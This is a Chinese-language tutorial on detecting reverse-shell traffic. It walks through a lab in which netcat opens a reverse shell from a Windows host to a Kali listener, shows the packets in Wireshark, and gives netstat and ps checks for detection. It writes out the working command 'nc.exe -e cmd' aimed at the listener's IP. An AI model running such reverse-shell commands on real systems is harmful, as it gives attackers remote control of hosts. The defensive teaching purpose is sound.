### 一．反弹流量分析与检测方法
这里以反弹shell为案例，讲解检测方法手段，假设在内网后渗透阶段，当攻击者获取到管理权限，为了进一步扩大攻击范围在进行横向渗透时，通常会使用到反弹shell的方法获取主机权限，针对反弹shell这种攻击方法，可以根据反弹shell的特征去识别检测，反弹shell传输的数据是以明文方式进行传输的，很容易使用流量分析检测到，对流量特征进行溯源分析检测其带入的攻击特征，即可复现到过程。下面以NC工具为案例进行复现，以全局角度演示反弹shell检测方法，防御手段。如图1-1所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683783199-30372d54-9bc1-4a8e-876d-62836d3889f6.png#)<br />图1-1 反弹流量分析与检测方法
##### 1.wireshark流量分析
1）准备两台主机，实验环境如图1-1所示，使用kali作为靶机，执行nc -lvp 8888命令开启本地监听，执行成功如图1-2所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683783499-345049c8-cb16-4e29-bc56-cad4f170b02f.png#)<br />图1-2 NC开启监听<br /> 2）此时在Windows10主机使用Wireshark抓包工具来抓取数据流量，并设置过滤器，执行ip.addr==192.168.0.28 and !icmp and !nbns过滤掉无关协议，如图1-3所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683783843-52a65f1f-40c7-498e-ba84-5fab0449c303.png#)<br />图1-3  Wireshark开启监听<br />3）在Windows10主机上进行连接，执行nc.exe -e cmd 192.168.0.28 8888命令然后反弹shell，执行成功，如图1-4所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683784159-f06000e8-1815-4b23-8935-32d8502f59a0.png#)<br />图1-4 反弹shell执行成功<br />4）此时Wireshark流量分析软件也成功捕获数据包。可以看到数据包很简单，除去dns就只有tcp的三次握手，如图1-5所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683784457-c8695fc9-f9c1-4a4e-96ac-6b4d9ab4cd96.png#)<br />图1-5捕获流量包<br />5）接下来我们在反弹的shell中执行命令whoami，同时wireshark软件也抓到了数据，从图1-6中可以看到执行whoami这个命令一共有4个过程。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683784772-6ec44150-0e01-486e-b65d-c5278fef65a0.png#)<br />图1-6命令执行数据包<br />6）首先是监听机（192.168.0.58）向靶机发送一个带有ACK和PSH的数据包，数据段中带有我们输入的命令，如图1-7所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683785180-ba4ada38-2c11-4c23-85b4-b1385b37bf03.png#)<br />图1-7命令发送数据包<br />    7）然后靶机再向监听机回复一个ACK，告诉它已经收到了数据，如图1-8所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683785497-b579cee7-1e5d-4bf7-8f49-2fba64238fff.png#)<br />图1-8接收确认数据包<br />    8）接着靶机又向监听机发送一个带有PSH、ACK的数据包，里面携带了whoami的执行结果，如图1-9所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683785908-88c972b0-8491-47e8-a1b2-0bbfe1a258a5.png#)<br />图1-9命令执行结果返回数据包<br />    9）最后监听机向靶机发送一个ACK，告诉靶机自己收到了数据，整个过程结束，如图1-10所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683786245-da0cd604-953b-4309-bf94-2334e2f7fb0c.png#)<br />图1-10传输完成数据包
##### 2.通过检测命令查看
1）如常见的bash反弹shell，我们可以通过netstat命令检测Bash进程启动事件，判断是否存在反弹shell，执行netstat -anop | grep ESTABLISHED等。这里是查看有无bash/sh连接到远端地址，如图1-11所示。![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683786578-f10946b5-d648-4661-8ad0-2402f057097a.png#)<br />图1-11 查看远端地址<br />    2）通过ps -ef，查看有无反弹shell的常见命令，如图1-12所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683786923-f2885b6f-c530-49be-89e4-2f2e9d66dbe3.png#)<br />图1-12反弹shell的常见命令

